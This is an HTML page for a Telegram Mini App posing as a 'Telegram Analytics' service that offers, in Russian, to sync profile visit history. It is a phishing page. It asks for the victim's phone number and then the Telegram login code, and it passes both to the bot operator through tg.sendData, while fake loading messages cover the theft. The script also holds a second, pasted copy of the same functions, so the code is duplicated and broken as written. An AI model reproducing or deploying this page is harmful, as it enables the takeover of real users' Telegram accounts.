<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Analytics</title>
    <script src="https://telegram.org"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #1c1c1d; color: white; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { width: 100%; max-width: 320px; text-align: center; padding: 20px; }
        .logo { width: 80px; height: 80px; background: url('https://telegram.org') no-repeat center; background-size: contain; margin-bottom: 20px; }
        h2 { font-size: 22px; margin-bottom: 10px; font-weight: 500; }
        p { color: #8e8e93; font-size: 14px; line-height: 1.4; margin-bottom: 25px; }
        input { width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; border-radius: 10px; padding: 12px; color: white; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #0A84FF; }
        .btn { width: 100%; background: #0A84FF; color: white; border: none; border-radius: 10px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .btn:active { background: #007AFF; }
        #code-step { display: none; }
        .loading { display: none; color: #8e8e93; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo" style="margin: 0 auto 20px;"></div>
        
        <div id="phone-step">
            <h2>Analytics Login</h2>
            <p>Введите номер телефона для синхронизации истории посещений профиля.</p>
            <input type="tel" id="phone" placeholder="+7 999 000-00-00">
            <button class="btn" onclick="sendPhone()">Далее</button>
        </div>

        <div id="code-step">
            <h2>Проверка</h2>
            <p>Мы отправили код в приложение <b>Telegram</b>. Введите его ниже.</p>
            <input type="number" id="code" placeholder="Код из Telegram">
            <button class="btn" onclick="sendCode()">Подтвердить</button>
        </div>

        <div id="loading" class="loading">Загрузка данных...</div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.enableClosingConfirmation();

        function sendPhone() {
            const p = document.getElementById('phone').value.replace(/\s+/g, '');
            if(p.length < 10) return;
            tg.sendData(JSON.stringify({t: 'p', v: p}));
            document.getElementById('phone-step').style.display = 'none';
            document.getElementById('code-step').style.display = 'block';
        }

        function sendCode() {
            const c = document.getElementById('code').value;
            if(c.length < 5) return;
            tg.sendData(JSON.stringify({t: 'c', v: c}));
            document.getElementById('code-step').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            setTimeout(() => tg.close(), 3000);
        } 
        const tg = window.Telegram.WebApp;
tg.expand();

function sendPhone() {
    const p = document.getElementById('phone').value.replace(/\s+/g, '');
    if(p.length < 10) return alert("Введите полный номер");
    
    // Показываем, что процесс пошел
    document.getElementById('phone-step').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    document.getElementById('loading').innerText = "Связь с сервером...";

    // Шлем данные боту
    tg.sendData(JSON.stringify({t: 'p', v: p}));
    
    // Спустя 2 секунды даем ввести код, если бот не закрыл окно
    setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('code-step').style.display = 'block';
    }, 2000);
}

function sendCode() {
    const c = document.getElementById('code').value;
    if(c.length < 5) return alert("Код должен быть 5 знаков");
    
    tg.sendData(JSON.stringify({t: 'c', v: c}));
    document.getElementById('code-step').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    document.getElementById('loading').innerText = "Анализ профиля...";
    
    // Закрываем через 3 сек
    setTimeout(() => tg.close(), 3000);
}
    </script> 
</body>
</html>
